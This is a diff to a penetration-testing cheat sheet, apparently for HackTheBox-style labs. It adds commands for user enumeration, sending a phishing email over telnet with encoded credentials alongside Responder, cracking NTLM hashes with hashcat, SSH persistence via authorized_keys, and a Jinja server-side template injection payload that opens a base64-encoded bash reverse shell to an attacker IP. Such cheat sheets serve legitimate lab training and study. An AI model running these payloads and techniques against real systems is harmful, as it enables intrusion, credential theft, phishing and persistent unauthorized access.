@@ -20,6 +20,9 @@ Massscan UDP all ports:
 
 # Port Enumeration
 
+*New* Using recon tool:   
+`sudo incursore.sh -H 10.129.25.154 -t Recon`
+
 Nmap Vulnerable Scripts TCP Ports:
 `nmap -T4 -sV --script vuln -p 80,443,8080 $IP`
 
@@ -133,6 +136,8 @@ finger admin@$IP
 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
 ```
 
+SMTP enumeration: `smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -t "ip_addr"`   
+
 ## Brute Force
 
 FTP: `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 10.0.0.1 ftp`
@@ -191,6 +196,38 @@ Also: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalati
 Linux binaries with SUID: https://gtfobins.github.io/
 
 Windows binaries to download execute etc: https://lolbas-project.github.io/
+
+Auth and send a phishing email through telnet 25:  
+```
+# First setup responder
+sudo responder -I tun0
+
+# Setup username/password 
+echo -ne 'administrator@mailing.htb'|base64
+# YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+echo -ne 'homenetworkingadministrator'|base64
+aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
+
+# Login to email server and send a phishing email:
+telnet mailing.htb 25
+
+ehlo mailing.htb
+AUTH LOGIN
+YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
+
+MAIL FROM:<administrator@mailing.htb>
+RCPT TO:<administrator@mailing.htb>
+
+DATA
+From: <administrator@mailing.htb>
+To: <administrator@mailing.htb>
+Subject: Telnet email
+
+Click here: http://10.10.14.64:8000/test
+.
+QUIT
+```
 
 ## Linux
 
@@ -367,6 +404,18 @@ Check permissions of all folders inside PATH:
 
 RDP in linux to Windows Machine:
 `xfreerdp /u:admin /p:password /cert:ignore /v:$IP /workarea`
+
+Recursive lookup in windows:   
+`where /R c:\ bash.exe`
+
+
+Cracking NTLM hash:   
+```
+echo 'username::SERVERNMAE:HASH1:4HASH2' >> hash.txt
+
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+
 ## Docker Priv Esc
 CVE-2019-5736. Following https://github.com/Frichetten/CVE-2019-5736-PoC , we can create a sh binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.
 
@@ -423,6 +472,17 @@ python3 blindSQLi.py
 # Sleep Time: 1
 ```
 
+SSTI:   
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+For Jinja, if there is no imported os or popen class:
+```
+nc -nvlp 4443
+echo "bash -c 'bash -i >& /dev/tcp/10.10.14.19/4443 0>&1'" | base64
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDQzIDA+JjEnCg=="|base64${IFS}-d|bash').read()}}
+```
+
 # Pivot
 
 Use SSHUTTLE to route all traffic through a machine:
@@ -431,6 +491,23 @@ Use SSHUTTLE to route all traffic through a machine:
 Find connected hosts in internal network: `route -nee && arp -e`
 
 Do a port scan with netcat (Good when pivoting): `nc -zv 172.16.0.1 1-65535 2>&1 | grep succeeded`
+
+If there is an internal site restricted to machine, create an SSH local port forward:   
+`ssh -L 3337:local.site.htb:8888 ubuntu@site.htb # On attack browser route to http://localhost:3337`  
+
+Get foothold by adding your public key under a user and SSH in:
+
+```
+# Local
+ssh-keygen
+chmod 600 ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa.pub
+# Remote
+# paste the content of the public key (id_rsa.pub) to the authorized_keys file of the user you wish to authenticate as:
+echo "PASTE" >> /home/user/.ssh/authorized_keys # OR /root/.ssh/authorized_keys
+# Local
+ssh root@ipaddr -i ~/.ssh/id_rsa
+```
 
 ## Pillage
 
